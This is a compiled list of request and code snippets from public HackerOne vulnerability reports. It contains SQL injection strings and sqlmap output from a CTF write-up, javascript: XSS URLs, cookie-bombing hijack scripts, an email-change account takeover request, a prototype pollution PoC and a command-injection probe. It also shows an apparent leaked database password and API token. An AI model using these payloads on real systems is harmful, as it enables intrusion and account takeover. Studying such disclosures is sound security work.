<button type="submit" style="position: absolute; left: 80px; height: 50px; top: 280px; width: 480px; background: transparent; border: 0;"></button></form>
<img src="login.png" width="600" /></center>
<script>parent.postMessage('{"message":"Shopify.API.Modal.setHeight","data":{"height":500,"width":"940"}}','*')</script>
```

## 52. [#1047100](https://hackerone.com/reports/1047100)  -  No rate limiting - Create data
*medium*

```http
POST /emailformdata/v1/amp-lists?projectId= HTTP/1.1
Host: my.stripo.email
Content-Type: application/json;charset=UTF-8
Content-Length: 198
Origin: https://my.stripo.email
```

## 53. [#1076047](https://hackerone.com/reports/1076047)  -  Bypass of #1047119: Missing Rate Limit while creating Plug-Ins at https://my.stripo.email/cabinet/plugins/
*medium*

```http
POST /cabinet/stripeapi/v1/plugin/357981/plugins HTTP/1.1
Host: my.stripo.email
Content-Type: application/json;charset=UTF-8
Content-Length: 108
Origin: https://my.stripo.email
```

## 54. [#1337178](https://hackerone.com/reports/1337178)  -  objectId in share location can be set to open arbitrary URL or Deeplinks
*medium*

```http
POST /ocs/v2.php/apps/spreed/api/v1/chat/wqfqmw9n/share HTTP/2
Host: localhost
Cookie: oc_sessionPassphrase=cookie; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestric…
Authorization: Basic 
Content-Type: application/x-www-form-urlencoded
Content-Length: 227

objectType=geo-location&objectId=https://ctulhu.me&referenceId=kkk&metaData={"type":"geo-location","id":"geo:14.600765443470294,121.00452968052457","latitude":"14.600765443470294","longitude":"121.00452968052457","name":"hehe"}
```

## 55. [#403602](https://hackerone.com/reports/403602)  -  Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)
*high*

```html
<script>
setTimeout(function(){
for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
}, 3000);
</script>
```

## 56. [#460920](https://hackerone.com/reports/460920)  -  Response program can create bounty table
*low, $500*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Referer: https://hackerone.com/bountyprogram/reward_settings
content-type: application/json
origin: https://hackerone.com
Content-Length: 1512
Cookie: ███████

{"query":"mutation Update_bounty_table_mutation($input_0:UpdateBountyTableInput!,$first_1:Int!,$types_2:[ErrorTypeEnum]!) {\n  updateBountyTable(input:$input_0) {\n    clientMutationId,\n    ...F1,\n    ...F2\n  }\n}\nfragment F0 on Team {\n  id,\n  bounty_table {\n    low_label,\n    medium_label,\n    high_label,\n    critical_label,\n    description,\n    _bounty_table_rows3iMmxf:bounty_table_rows(first:$first_1) {\n      edges {\n        node {\n          id,\n          low,\n          medium,\n          high,\n          critical,\n          structured_scope {\n            id\n          }\n        },\n        cursor\n      },\n      pageInfo {\n        hasNextPage,\n        hasPreviousPage\n      }\n    },\n    id,\n    team {\n      id\n    }\n  }\n}\nfragment F1 on UpdateBountyTablePayload {\n  team {\n    id,\n    ...F0\n  }\n}\nfragment F2 on UpdateBountyTablePayload {\n  was_successful,\n  _errors2S3JlH:errors(types:$types_2) {\n    edges {\n      node {\n        type,\n        field,\n        message,\n        id\n      },\n      cursor\n    },\n    pageInfo {\n      hasNextPage,\n      hasPreviousPage\n    }\n  }\n}","variables":{"input_0":{"team_id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMzYyOTE=","bounty_table_rows":[{"id":null,"destroy":false,"low":100,"medium":100,"high":100,"critical":100,"structured_scope_id":null}],"low_label":"Low","medium_label":"Medium","high_label":"High","critical_label":"Critical","description":"","clientMutationId":"0"},"first_1":100,"types_2":"ARGUMENT"}}
# … truncated …
```

## 57. [#1139528](https://hackerone.com/reports/1139528)  -  Editing Pentest Summary Report Answers After Submitting Them
*low*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Referer: https://hackerone.com/******************************************************************
content-type: application/json
Content-Length: 1498
Origin: https://hackerone.com
Cookie: ******************************************************************

{"operationName":"UpdatePentestFormAnswer","variables":{"pentestFormAnswerId":"******************************************************************","content":"Blah blah blah"},"query":"mutation UpdatePentestFormAnswer($pentestFormAnswerId: ID!, $content: String!) {\n  updatePentestFormAnswer(input: {pentest_form_answer_id: $pentestFormAnswerId, content: $content}) {\n    was_successful\n    pentest_form_answer {\n      id\n      content\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## 58. [#1139528](https://hackerone.com/reports/1139528)  -  Editing Pentest Summary Report Answers After Submitting Them
*low*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Referer: https://hackerone.com/******************************************************************
content-type: application/json
Content-Length: 1498
Origin: https://hackerone.com
```

## 59. [#403602](https://hackerone.com/reports/403602)  -  Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)
*high*

```html
<html manifest="[manifest_url]">
This is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.
<script>
setTimeout(function(){
for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
}, 3000);
</script>
</html>
```

## 60. [#470749](https://hackerone.com/reports/470749)  -  Ability to perform actions (Tweet, Retweet, DM) and other actions, unauthenticated, on any account with SMS enabled.
*critical*

```http
Delete someones tweets

Turn off all phone SMS notifications
```

## 61. [#1546268](https://hackerone.com/reports/1546268)  -  CVE-2022-27775: Bad local IPv6 connection reuse
*low*

```
Listening on :: 9999
Connection received on somehost someport
GET /x HTTP/1.1
Host: [ipv6addr]:9999
User-Agent: curl/7.83.0-DEV
Accept: */*

GET /y HTTP/1.1
Host: [ipv6addr]:9999
User-Agent: curl/7.83.0-DEV
Accept: */*
```

## 62. [#2450215](https://hackerone.com/reports/2450215)  -  Any user could upload attachments to pentest scoping form they don't have access to
*high*

```http
POST /attachments HTTP/2
Host: hackerone.com
Cookie: your cookies
```

## 63. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /people-rater/entry?id=eyJpZCI6MX0%3d HTTP/1.1
Host: hackyholidays.h1ctf.com

{ "id":"eyJpZCI6MX0=",
  "name":"The Grinch",
  "rating":"Amazing in every possible way!",
  "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}
```

## 64. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com

{
  "uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username":"grinch",
  "address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},
  "flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
```

## 65. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup=%7B%7Btemplate%3Acbdj3_grinch_header.html%7D%7D&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D
```

## 66. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

...

You do not have access to the file 38dhs_admins_only_header.html
```

## 67. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com

action=signup&username=grinch54321&password=a&age=9e9&firstname=aaa&lastname=bbbbbbbbY
```

## 68. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+1,NULL,NULL--+- HTTP/1.1
Host: hackyholidays.h1ctf.com

[picture from album 1 returned]  <--- THIS IS THE KEY DISCOVERY!!!
```

## 69. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+"-1'+union+all+select+NULL,NULL,0x41--+-",2,3--+- HTTP/1.1
Host: hackyholidays.h1ctf.com

<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL0EiLCJhdXRoIjoiNjAxNDZjMGY5YTQ0YTgyNWZhYTIzZTJkZDE3OWMxM2QifQ==">
```

## 70. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /people-rater/entry?id=eyJpZCI6MX0%3d HTTP/1.1
Host: hackyholidays.h1ctf.com

{ "id":"eyJpZCI6MX0=",
```

## 71. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /swag-shop/api/user HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 72. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com

{
```

## 73. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 74. [#3766455](https://hackerone.com/reports/3766455)  -  Yelp for Business: locked Email field silently editable via API
*medium*

```http
POST https://graphql-mobile-api.yelp.com/gql/mobile
   content-type: application/json; charset=utf-8

{"extensions":{"clientLibrary":{"name":"apollo-kotlin","version":"4.4.3"},"documentId":"fbfe5585929a3f12b0fcf332f967dfb78e3197d5a4f27f2f69f112c4d3341db6","operationType":"query"},"variables":{}}
```

## 75. [#3766455](https://hackerone.com/reports/3766455)  -  Yelp for Business: locked Email field silently editable via API
*medium*

```http
POST https://biz-app.yelp.com/account/info/bio/v1
   content-type: application/json; charset=UTF-8

{"first_name":"<current>","last_name":"<current>","email":"attacker@example.com","role":"OWNER"}
```

## 76. [#3766455](https://hackerone.com/reports/3766455)  -  Yelp for Business: locked Email field silently editable via API
*medium*

```http
POST https://biz-app.yelp.com/account/forgot_password/v1
   content-type: application/x-www-form-urlencoded

email=attacker%40example.com
```

## 77. [#700831](https://hackerone.com/reports/700831)  -  Unauthenticated read and write access to ALL endpoints of a store is possible for removed staff members who had "Apps" permission
*medium*

```http
GET /admin/orders.json HTTP/1.1
Host: victim-store-mariogh.myshopify.com
Content-type: application/json
```

## 78. [#672487](https://hackerone.com/reports/672487)  -  Business Logic Flaw - A non premium user can change/update retailers to get cashback on all the retailers associated with Curve
*medium*

```http
GET /v1/rewards/users/programs/e329e463-7f5d-4358-9109-4f97c9f86abd/merchants HTTP/1.1
Authorization: APE7kg446BXw2iFEI6Ca079RaGrJ3bcelA9DKDoUFUA
Host: api.imaginecurve.com
```

## 79. [#1446107](https://hackerone.com/reports/1446107)  -  Verification process done using different documents without corresponding to user information / User information can be changed after verification
*medium*

```http
PATCH /kyc_back/api/v2/surveys/personal_info
Host: my.exness.com
```

## 80. [#1691603](https://hackerone.com/reports/1691603)  -  A Unverified User Can Post Newsletter (Which Is Not Allowed Through Application UI)
*low*

```http
POST /voyager/api/publishing/contentSeries HTTP/2
Host: www.linkedin.com
Cookie: xxx
```

## 81. [#808975](https://hackerone.com/reports/808975)  -  Rounding errors on rewarding a bounty leads to bypassing the 20% H1 commission fee
*low*

```http
POST
X-CSRF-Token: you_token_:)

message=&substate=bounty-award&bounty_amount=0.01&reference=&add_reporter_to_original=false&reply_action=set-bounty&mark_ineligible_for_bounty=false&reports_count=1&report_ids%5B%5D=808343&bounty_currency=USD
```

## 82. [#1089978](https://hackerone.com/reports/1089978)  -  [h1-2102] [Yaworski's Broskis] Suspected overcharge and chargebacks in PoS
*low*

```http
POST /admin/api/unstable/checkouts/5788adb325c4824f193d08daf474f21a/payments.json HTTP/1.1
Host: c0rv4x2.myshopify.com
```

## 83. [#403602](https://hackerone.com/reports/403602)  -  Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)
*high*

```html
<script>
alert('Your request to the page '+location.href+' is hijacked!');
</script>
```

## 84. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```
' or  1=1 or '2'='1  ---> There is 24358 other pl
```

## 85. [#1954658](https://hackerone.com/reports/1954658)  -  CVE-2023-28322: more POST-after-PUT confusion
*low*

```bash
CURL *curl = curl_easy_init();
if(curl) {
  const char *data = "data to send";
 
  curl_easy_setopt(curl, CURLOPT_URL, "https://example.com");
 
  /* size of the POST data */
  curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 12L);
 
  /* pass in a pointer to the data - libcurl will not copy */
  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
 
  curl_easy_perform(curl);
}
```

## 86. [#422279](https://hackerone.com/reports/422279)  -  H1514 Simple phishing using auto-created modal with weak URL-pattern check in incontext_app_link
*medium*

```html
<script>parent.postMessage('{"message":"Shopify.API.Modal.setHeight","data":{"height":500,"width":"940"}}','*')</script>
```

## 87. [#1555796](https://hackerone.com/reports/1555796)  -  CVE-2022-27782: TLS and SSH connection too eager reuse
*medium*

```
; sleep 5;
```

## 88. [#403602](https://hackerone.com/reports/403602)  -  Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)
*high*

```html
<html>
<script>
alert('Your request to the page '+location.href+' is hijacked!');
</script>
</html>
```

## 89. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```
name=NOME' or 22=1 or '2'='1  ---> There is 0 other player(s) with the same name as you!
name=NOME' or  1=1 or '2'='1  ---> There is 24358 other player(s) with the same name as you
```

## 90. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```
...
[17:19:23] [INFO] POST parameter 'name' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
...
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: name=-3268' OR 6136=6136-- ibKa
    Vector: OR [INFERENCE]
```

## 91. [#776371](https://hackerone.com/reports/776371)  -  [chart.js] Prototype pollution
*low*

```html
<script src="node_modules/chart.js/dist/Chart.bundle.js"></script>
```

## 92. [#1082847](https://hackerone.com/reports/1082847)  -  Config override using non-validated query parameter allows at least reflected XSS by injecting configuration into state
*medium*

```
https://app.grammarly.com/docs/new?config={%22account%22:{%22subscription%22:%22javascript:alert(document.domain)//%22},%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
```

## 93. [#1082847](https://hackerone.com/reports/1082847)  -  Config override using non-validated query parameter allows at least reflected XSS by injecting configuration into state
*medium*

```
https://app.grammarly.com/?config={%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
```

## 94. [#1082847](https://hackerone.com/reports/1082847)  -  Config override using non-validated query parameter allows at least reflected XSS by injecting configuration into state
*medium*

```
https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22javascript:alert(document.domain)//%22}}
```

## 95. [#1420697](https://hackerone.com/reports/1420697)  -  [app.lemlist.com] Improper handling of payment lead to bypass payment
*high*

```json
{{F1538593}}
```

## 96. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```json
{{template:file.html}}
```

## 97. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```json
{{template:file}}
```

## 98. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```json
{{name}}
```

## 99. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```json
{{template%3a38dhs_admins_only_header.html}}
```

## 100. [#776371](https://hackerone.com/reports/776371)  -  [chart.js] Prototype pollution
*low*

```html
<canvas id="canvas"></canvas>
        <script src="node_modules/chart.js/dist/Chart.bundle.js"></script>
        <script>
            var ctx = document.getElementById('canvas').getContext('2d');
            var chart = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: ['January', 'February', 'March', 'April', 'May'],
                    datasets: [{
                        label: 'My First dataset',
                        backgroundColor: 'rgb(255, 99, 132)',
                        borderColor: 'rgb(255, 99, 132)',
                        data: [0, 10, 5, 2, 20]
                    },
                    JSON.parse(`{"__proto__": {"abc": "Injected value through dataset"}}`)
                    ]
                },
                options: JSON.parse(`{"__proto__": {"def": "Injected value through options"}}`)
            });
            console.log({}.abc); // Print "Injected value through dataset"
            console.log({}.def); // Print "Injected value through options"
        </script>
```

## 101. [#700831](https://hackerone.com/reports/700831)  -  Unauthenticated read and write access to ALL endpoints of a store is possible for removed staff members who had "Apps" permission
*medium*

```json
{{this}}
```

## 102. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```
commit efb92ef3f561a957caad68fca2d6f8466c4d04ae
Author: Adam <adam@umbrella.info>
Date:   Mon Dec 7 16:36:07 2020 +0000

    small fix

diff --git a/models/Db.php b/models/Db.php
index 5bea1f5..1dc435c 100755
--- a/models/Db.php
+++ b/models/Db.php
@@ -131,7 +131,7 @@ class Db {
      */
     static public function read(){
         if( gettype(self::$read) == 'string' ) {
-            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
+            self::$read = new DbConnect( false, '', '','' );
```

## 103. [#3733910](https://hackerone.com/reports/3733910)  -  CVE-2026-8932: incomplete mTLS config matching in conn reuse
*low*

```c
/*
 * F12 PoC: TLS connection-reuse with mismatched private-key config
 *
 * Two easy handles A and B sharing one connection pool (via curl_share +
 * CURL_LOCK_DATA_CONNECT and CURL_LOCK_DATA_SSL_SESSION) point at
 * https://server.test:8443/. Both configure CURLOPT_SSLCERT to certA.pem
 * (CN=alice). A has the correct CURLOPT_KEYPASSWD; B has a deliberately
 * wrong CURLOPT_KEYPASSWD ("wrong-password").
 *
 * Expected if curl correctly distinguished the SSL configurations of A
 * and B: B should not be able to reuse A's connection (its key cannot be
 * loaded with the wrong passphrase) and B's curl_easy_perform() should
 * fail with CURLE_SSL_CERTPROBLEM or similar.
 *
 * Observed (the bug):
 *   - match_ssl_primary_config in lib/vtls/vtls.c:194-225 only diffs
 *     struct ssl_primary_config.
 *   - CURLOPT_KEYPASSWD is stored in struct ssl_config_data.key_passwd
 *     (lib/urldata.h:179), NOT in primary -> never compared.
 *   - The cert PATH (primary.clientcert) matches for both A and B, and
 *     all other primary fields match (same verify settings, same scheme,
 *     etc.), so url_match_ssl_config returns TRUE.
 *   - B reuses A's connection, never tries to load its (wrong) key, and
 *     succeeds with HTTP 200. Server still sees CN=alice for B.
 *
 * Build:
 *   gcc -Wall -O0 -g -Icurl/include \
 *       F12_poc.c \
 *       curl/lib/.libs/libcurl.a \
 *       -lssl -lcrypto -lz -lpsl -lzstd -lbrotlidec -lidn2 -lnghttp2 \
 *       -lldap -llber -lssh2 -lpthread -ldl \
 *       -o F12_poc
 *
 * Run (with server.py listening on 127.0.0.1:8443):
 *   F12_poc
# … truncated …
```

## 104. [#1182864](https://hackerone.com/reports/1182864)  -  Subdomain takeover of fr1.vpn.zomans.com
*medium, $350*

```
% dig +short fr1.vpn.zomans.com
52.47.57.107

% curl fr1.vpn.zomans.com
<!-- hackerone.com/ian -->
```

## 105. [#1082847](https://hackerone.com/reports/1082847)  -  Config override using non-validated query parameter allows at least reflected XSS by injecting configuration into state
*medium*

```js
, s = function(e, t) {
                const n = u.Monitoring.Logging.getLogger("config.parser");
                return Object(i.pipe)(t, c.h.chain(e=>Object(i.pipe)(c.b.tryCatchError(()=>JSON.parse(e)), c.b.mapLeft(n.handler("Parse error of the provided JSON config", {
                    config: e
                }).info), c.h.fromEither)), c.h.fold(()=>e, t=>Object(i.pipe)(ye.decode(t), c.b.mapLeft(ge.failure), c.b.mapLeft(e=>n.info("Validation error of the provided JSON config", {
                    config: t,
                    error: e
                })), c.b.fold(()=>e, t=>{
                    n.info("Load app with custom config", t);
                    const r = c.k.asks(()=>e);
                    return c.k.createFrom(r)(()=>t)(void 0)
                }
                ))))
            }(Object(d.b)(), a.query.get("config"))
```

## 106. [#1112679](https://hackerone.com/reports/1112679)  -  Dangling cloud instance at vpn.inverselink.com
*low, $500*

```
% dig  vpn.inverselink.com +short
54.202.130.246

 % curl -v https://vpn.inverselink.com
*   Trying 54.202.130.246...
* TCP_NODELAY set
* Connected to vpn.inverselink.com (54.202.130.246) port 443 (#0)
[...]
* Server certificate:
*  subject: C=US; ST=California; L=Pleasanton; O=Workday Inc.; CN=*.workdaysuv.com
```

## 107. [#381356](https://hackerone.com/reports/381356)  -  Client-Side Race Condition using Marketo, allows sending user to data-protocol in Safari when form without onSuccess is submitted on www.hackerone.com
*low*

```js
form.onSuccess(function() {
        return false;
      });
```

## 108. [#2384833](https://hackerone.com/reports/2384833)  -  CVE-2024-2004: Usage of disabled protocol
*low*

```
e6f8445edef8e7996d1cfb141d6df184efef972c is the first bad commit
commit e6f8445edef8e7996d1cfb141d6df184efef972c
Author: Daniel Stenberg <daniel@haxx.se>
Date:   Mon Jun 13 09:30:45 2022 +0200

    setopt: add CURLOPT_PROTOCOLS_STR and CURLOPT_REDIR_PROTOCOLS_STR

    ... as replacements for deprecated CURLOPT_PROTOCOLS and
    CURLOPT_REDIR_PROTOCOLS as these new ones do not risk running into the
    32 bit limit the old ones are facing.

    CURLINFO_PROTCOOL is now deprecated.

    The curl tool is updated to use the new options.

    Added test 1597 to verify the libcurl protocol parser.

    Closes #8992
```

## 109. [#3733910](https://hackerone.com/reports/3733910)  -  CVE-2026-8932: incomplete mTLS config matching in conn reuse
*low*

```bash
gcc -Wall -O0 -g -Icurl/include \
    F12_poc.c \
    curl/lib/.libs/libcurl.a \
    -lssl -lcrypto -lz -lpsl -lzstd -lbrotlidec -lidn2 -lnghttp2 \
    -lldap -llber -lssh2 -lpthread -ldl \
    -o F12_poc
```

## 110. [#1573634](https://hackerone.com/reports/1573634)  -  CVE-2022-32207: Unpreserved file permissions
*medium*

```
/* If old file is a regular file attempt creating a new file with same ownership */
  struct stat st;
  if (stat(filename, &st) != -1 && S_ISREG(st.st_mode)) {
    FILE *file;
    int fd;
    struct stat nst;
    fd = open(tempstore, O_CREAT | O_EXCL, 0700);
    if (fd == -1)
      goto fail;
    if (fstat(fd, &nst) == -1 ||
       nst.st_uid != st.st_uid || nst.st_gid != st.st_gid) {
      /* newly created file doesn't have same ownership, we can't proceed safely */
      close(fd);
      unlink(tempstore);
      goto fail; // or perhaps try direct write instead?
     }
    /* use same mode as old file */
    if (fchmod(fd, st.st_mode) == -1) {
      close(fd);
      unlink(tempstore);
      goto fail;
    }
    file = fdopen(fd, FOPEN_WRITETEXT);
    if (!file) {
      close(fd);
      unlink(tempstore);
      goto fail;
   }
   /* write to file */
   /* if successful move file over filename etc */
  }
  else  {
    /* use direct file write */
  }
```

## 111. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```
php > print intval("9e9");
9000000000
```

## 112. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
Getting Host Information for: 127.0.0.1
```

## 113. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
Getting Host Information for: 192.168.1.1.xip.io
```

## 114. [#3733910](https://hackerone.com/reports/3733910)  -  CVE-2026-8932: incomplete mTLS config matching in conn reuse
*low*

```py
#!/usr/bin/env python3
"""
mTLS server for F12 PoC. Requests/optionally requires a client cert and
logs the client cert subject for each request. Returns 200 OK with a
small body. Designed for keep-alive connection reuse so the second
curl handle (B) reuses the TLS connection of the first (A).

Run: python3 server.py
"""
import socket
import ssl
import sys
import threading
import time

HOST = "127.0.0.1"
PORT = 8443
SERVER_CERT = "server.crt"
SERVER_KEY = "server.key"
# Trust both clientA and clientB by accepting any self-signed cert with
# CERT_OPTIONAL and just inspecting the subject; for stricter mTLS one
# would CERT_REQUIRED + load_verify_locations with both client certs.
CA_BUNDLE = "clients-ca.pem"


def make_ctx():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(SERVER_CERT, SERVER_KEY)
    # Require a client cert.
    ctx.verify_mode = ssl.CERT_REQUIRED
    ctx.load_verify_locations(CA_BUNDLE)
    return ctx


REPLY = (
    "HTTP/1.1 200 OK\r\n"
    "Content-Length: 2\r\n"
    "Connection: keep-alive\r\n"
    "Keep-Alive: timeout=30\r\n"
    "\r\n"
# … truncated …
```

## 115. [#397792](https://hackerone.com/reports/397792)  -  @wearehackerone.com is vulnerable to namespace attacks due to hackerone.com not being RFC2142 compliant.
*medium*

```http
postmaster
```

## 116. [#672487](https://hackerone.com/reports/672487)  -  Business Logic Flaw - A non premium user can change/update retailers to get cashback on all the retailers associated with Curve
*medium*

```
HTTP/1.1 200 OK
Date: Tue, 13 Aug 2019 14:55:30 GMT
Content-Type: application/json
Connection: close
server: envoy
cache-control: no-cache, private
set-cookie: device_view=full; expires=Fri, 13-Sep-2019 14:55:30 GMT; Max-Age=2678400; path=/; HttpOnly
x-envoy-upstream-service-time: 48
Content-Length: 734

{"success":true,"data":{"merchants":[{"id":"7603f8b7-407c-4234-9153-7fe3b29863ed","name":"Waitrose","alias":"waitrose","hidden":false,"countries":["GBR"],"category":{"id":"0856b35f-ea59-479a-8f25-b70772d39dc8","name":"Groceries","curve_category_id":10},"percentage":1},{"id":"ca6daefd-f772-4286-9d70-504b094a98b8","name":"Whole Foods","alias":"wholefoods","hidden":false,"countries":["GBR"],"category":{"id":"0856b35f-ea59-479a-8f25-b70772d39dc8","name":"Groceries","curve_category_id":10},"percentage":1},{"id":"efb47f27-d905-4047-889c-f4da68e5a9b3","name":"Tesco","alias":"tesco","hidden":false,"countries":["GBR"],"category":{"id":"0856b35f-ea59-479a-8f25-b70772d39dc8","name":"Groceries","curve_category_id":10},"percentage":1}]}}
```

## 117. [#719856](https://hackerone.com/reports/719856)  -  Prototype pollution in dot-prop
*medium*

```http
Get, set, or delete a property from a nested object using a dot path

## Module Stats
```

## 118. [#1337178](https://hackerone.com/reports/1337178)  -  objectId in share location can be set to open arbitrary URL or Deeplinks
*medium*

```
HTTP/2 201 Created
Date: Sat, 11 Sep 2021 17:30:22 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 509
Expires: Thu, 19 Nov 1981 08:52:00 GMT


{"ocs":{"meta":{"status":"ok","statuscode":201,"message":"OK"},"data":{"id":237,"token":"wqfqmw9n","actorType":"users","actorId":"secret","actorDisplayName":"secret","timestamp":1631381422,"message":"{object}","messageParameters":{"actor":{"type":"user","id":"secret","name":"secret"},"object":{"type":"geo-location","id":"https:\/\/ctulhu.me","latitude":"14.600765443470294","longitude":"121.00452968052457","name":"hehe"}},"systemMessage":"","messageType":"comment","isReplyable":true,"referenceId":"kkk"}}}
```

## 119. [#1089978](https://hackerone.com/reports/1089978)  -  [h1-2102] [Yaworski's Broskis] Suspected overcharge and chargebacks in PoS
*low*

```
There are four  values which interest us here: `amount`, `amount_in`, `amount_rounding` and `amount_out`. Those control how much the client is charged. They should follow the formula `amount = amount_in - amount_rounding - amount_out`. `amount`  should always remain the price of the cart.
 `amount_in` is how much is charged from the client. `amount_out` is how much is taken from the shop. Looks like `amount_rounding` is a number which is not taken from anyone and is in fact some in-fact-rounding-value.

Some of these values allow negative values which broadens our possibilities. Let's see how it works. 

## Steps To Reproduce:
You would need PoS in your show installed and installed on your phone (I used iphone with jailbreak to proxy data into Burp). https://apps.shopify.com/shopify-pos.

> NOTE: I have used the test store to work with the payments. In real case this might work differently, but since I couldn't find a way to approve that, I decided to submit it nonetheless.

Create a new order with an item. I will be using a $1.09 dummy item from my shop. Now start the checkout process and select credit card as a payment source.

{F1176221}

{F1176222}

Enter card details and be ready to intercept this request.
{F1176223}

We are looking for the similar `payments.json` request:
  
{F1176220}
# … truncated …
```

## 120. [#808755](https://hackerone.com/reports/808755)  -  Mismatch between frontend and backend validation via `ban_researcher` leads to H1 support and hackers email spam
*low*

```http
POST:
X-CSRF-Token: you_token_:)`

message_to_hackerone=test"><h1>asd&message_to_researcher=test"><h1>asd
```

## 121. [#1704017](https://hackerone.com/reports/1704017)  -  CVE-2022-32221: POST following PUT confusion
*medium*

```
#include <stdio.h>
#include <string.h>
#include <curl/curl.h>

typedef struct
{
    char *buf;
    size_t len;
} put_buffer;

static size_t put_callback(char *ptr, size_t size, size_t nmemb, void *stream)
{
    put_buffer *putdata = (put_buffer *)stream;
    size_t totalsize = size * nmemb;
    size_t tocopy = (putdata->len < totalsize) ? putdata->len : totalsize;
    memcpy(ptr, putdata->buf, tocopy);
    putdata->len -= tocopy;
    putdata->buf += tocopy;
    return tocopy;
}

int main()
{
    CURL *curl = NULL;
    put_buffer pbuf = {};
    char *otherdata = "This is some other data";

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();

    // PUT
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
    curl_easy_setopt(curl, CURLOPT_READFUNCTION, put_callback);
    pbuf.buf = strdup("This is highly secret and sensitive data");
    pbuf.len = strlen(pbuf.buf);
    curl_easy_setopt(curl, CURLOPT_READDATA, &pbuf);
    curl_easy_setopt(curl, CURLOPT_INFILESIZE, pbuf.len);
    curl_easy_setopt(curl, CURLOPT_URL, "http://host1.com/putsecretdata");
    curl_easy_perform(curl);
# … truncated …
```

## 122. [#789579](https://hackerone.com/reports/789579)  -  ActiveStorage direct upload fails to sign content-length header for S3 service
*medium*

```ruby
def url_for_direct_upload(key, expires_in:, content_type:, content_length:, checksum:)
      instrument :url, key: key do |payload|
        generated_url = object_for(key).presigned_url :put, expires_in: expires_in.to_i,
          content_type: content_type, content_length: content_length, content_md5: checksum,
          whitelist_headers: ['content-length']

        payload[:url] = generated_url

        generated_url
      end
